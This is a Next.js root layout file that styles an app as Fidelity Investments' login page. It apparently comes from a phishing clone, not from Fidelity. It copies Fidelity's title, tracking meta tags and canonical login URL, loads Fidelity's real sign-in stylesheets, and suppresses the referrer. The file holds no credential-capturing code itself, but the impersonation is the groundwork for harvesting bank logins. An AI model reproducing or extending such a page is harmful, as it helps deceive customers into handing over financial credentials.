import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "Log in to Fidelity",
  description: "Fidelity Investments Login",
  viewport: "width=device-width,initial-scale=1",
  icons: {
    icon: "/favicon.ico",
  },
  openGraph: {
    title: "Log in to Fidelity",
    description: "Fidelity Investments Login",
    type: "website",
  },
  twitter: {
    card: "summary",
    title: "Log in to Fidelity",
    description: "Fidelity Investments Login",
  },
  other: {
    CHANNEL: "Fid.com web",
    SECSUB: "/Login/No CID",
    SOURCE: "Fidelity",
    PAGE: "Corporate Login",
    PAGEVERSION: "Full Page",
    PURPOSE: "Customer Service",
    referrer: "no-referrer",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <head>
        <link rel="icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="canonical" href="https://digital.fidelity.com/prgw/digital/login/full-page" />
        <link
          rel="stylesheet"
          href="https://digital.fidelity.com/stgw/digital/login/dist/dom-signin-68cb94baa020a3239b82.css"
        />
        <link
          rel="stylesheet"
          href="https://digital.fidelity.com/stgw/digital/login/dist/dom-signin-107a7f9c4e8e9360d3c0.css"
        />
        <script
          src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
          integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
          crossOrigin="anonymous"
          referrerPolicy="no-referrer"
          async
        />
      </head>
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
        data-masking="true"
      >
        {children}
      </body>
    </html>
  );
}
